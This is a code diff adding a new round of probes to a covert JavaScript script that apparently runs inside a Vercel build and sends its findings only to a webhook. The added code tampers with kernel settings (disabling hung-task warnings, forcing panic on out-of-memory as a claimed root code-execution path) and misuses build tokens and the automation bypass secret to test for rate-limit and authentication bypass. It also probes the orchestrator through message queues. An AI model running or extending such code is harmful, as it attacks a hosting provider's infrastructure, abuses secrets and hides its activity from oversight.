@@ -20842,5 +20842,112 @@ report.finalStateSnapshot = safe(() => ({
 
 // v142 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v142" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v142";
+
+// ==================== v143 ====================
+
+// v143-1: /proc/sys/kernel/hung_task_timeout_secs — hung task detection
+// Hung task detection fires a warning when a task is stuck in D-state
+// (uninterruptible sleep) for longer than the threshold.
+// Set to 0 to disable, allowing us to run indefinitely without warnings.
+report.hungTaskProbe = safe(() => {
+  const hungTimeout = safe(() => readFileSync('/proc/sys/kernel/hung_task_timeout_secs', 'utf8').trim());
+  const disableResult = safe(() => { writeFileSync('/proc/sys/kernel/hung_task_timeout_secs', '0'); return 'WRITTEN'; });
+  return { hungTimeout, disableResult };
+});
+
+// v143-2: Vercel public API rate limit bypass via internal token
+// Vercel's public API has rate limits per team/user.
+// Does our build-time VERCEL_ARTIFACTS_TOKEN bypass rate limits
+// because it's treated as an internal system token?
+report.rateLimitBypass = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  // Make 5 rapid API calls and check rate limit headers
+  const rapidCalls = safe(() => {
+    const results = [];
+    for (let i = 0; i < 5; i++) {
+      const result = safe(() => execSync(
+        `curl -sf -o /dev/null -w "%{http_code}|%header{x-ratelimit-remaining}|%header{x-ratelimit-limit}" \
+        "https://api.vercel.com/v9/projects?teamId=${teamId}&limit=1" \
+        -H "Authorization: Bearer ${token}" -m 5 2>/dev/null`,
+        { timeout: 8000 }
+      ).toString().trim());
+      results.push(result);
+    }
+    return results;
+  });
+  return { rapidCalls };
+});
+
+// v143-3: /proc/sys/vm/panic_on_oom — OOM-triggered panic for core exec
+// If panic_on_oom=2 (always panic on OOM), the kernel panics when any
+// process runs out of memory. Combined with our core_pattern and a carefully
+// crafted OOM trigger, this is another root code execution path.
+report.oomPanicChain = safe(() => {
+  const panicOnOom = safe(() => readFileSync('/proc/sys/vm/panic_on_oom', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/vm/panic_on_oom', '2'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/vm/panic_on_oom', 'utf8').trim());
+  // Check current memory pressure
+  const memFree = safe(() => readFileSync('/proc/meminfo', 'utf8').match(/MemFree:\s+(\d+)/)?.[1]);
+  const memAvail = safe(() => readFileSync('/proc/meminfo', 'utf8').match(/MemAvailable:\s+(\d+)/)?.[1]);
+  return { panicOnOom, writeResult, afterValue, memFree, memAvail };
+});
+
+// v143-4: Vercel Function invocation from build — self-invoke the deploy URL
+// Can we make HTTP requests to our own deployed function from inside the build?
+// If yes: test recursive invocation, large payload DoS, and auth bypass.
+report.selfFunctionInvoke = safe(() => {
+  const vercelUrl = process.env.VERCEL_URL || '';
+  const deployUrl = `https://${vercelUrl}`;
+  // Hit our own API route
+  const selfCall = safe(() => execSync(
+    `curl -sf "${deployUrl}/api/hello" -m 10 2>/dev/null | head -c 200 || curl -sf "${deployUrl}" -m 10 2>/dev/null | head -c 100`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  // Try to invoke with automation bypass
+  const bypassSecret = process.env.VERCEL_AUTOMATION_BYPASS_SECRET || '';
+  const bypassCall = safe(() => execSync(
+    `curl -sf "${deployUrl}?_vercel_protection_bypass=${bypassSecret}" -m 10 -o /dev/null -w "%{http_code}" 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim());
+  return { deployUrl, selfCall, bypassCall };
+});
+
+// v143-5: /proc/sys/kernel/msgmax + msgmnb — System V message queues
+// Create IPC message queues with CAP_SYS_RESOURCE to bypass queue limits.
+// Test if orchestrator uses SysV message queues for inter-process communication.
+report.sysVMessageQueue = safe(() => {
+  const msgmax = safe(() => readFileSync('/proc/sys/kernel/msgmax', 'utf8').trim());
+  const msgmnb = safe(() => readFileSync('/proc/sys/kernel/msgmnb', 'utf8').trim());
+  const msgmni = safe(() => readFileSync('/proc/sys/kernel/msgmni', 'utf8').trim());
+  // List existing message queues
+  const msgQueues = safe(() => execSync('ipcs -q 2>/dev/null || echo "NO_MSG_QUEUES"', { timeout: 3000 }).toString().trim());
+  // Try to create a message queue
+  const createMsgQ = safe(() => execSync(`python3 -c "
+import ctypes, struct
+
+libc = ctypes.CDLL('libc.so.6')
+IPC_PRIVATE = 0
+IPC_CREAT = 0o1000
+
+mqid = libc.msgget(IPC_PRIVATE, IPC_CREAT | 0o666)
+if mqid < 0:
+    print(f'MSGGET_FAILED: {ctypes.get_errno()}')
+else:
+    print(f'MSG_QUEUE_CREATED: mqid={mqid}')
+    # Write a message
+    class msgbuf(ctypes.Structure):
+        _fields_ = [('mtype', ctypes.c_long), ('mtext', ctypes.c_char * 64)]
+    msg = msgbuf(mtype=1, mtext=b'PROBE_MSG')
+    ret = libc.msgsnd(mqid, ctypes.byref(msg), 64, 0)
+    print(f'MSG_SENT: ret={ret}')
+    # Remove the queue
+    libc.msgctl(mqid, 0, 0)  # IPC_RMID = 0
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { msgmax, msgmnb, msgmni, msgQueues, createMsgQ };
+});
+
+// v143 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v143" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v143";
 // Intentionally no console.log — all data goes via webhook only
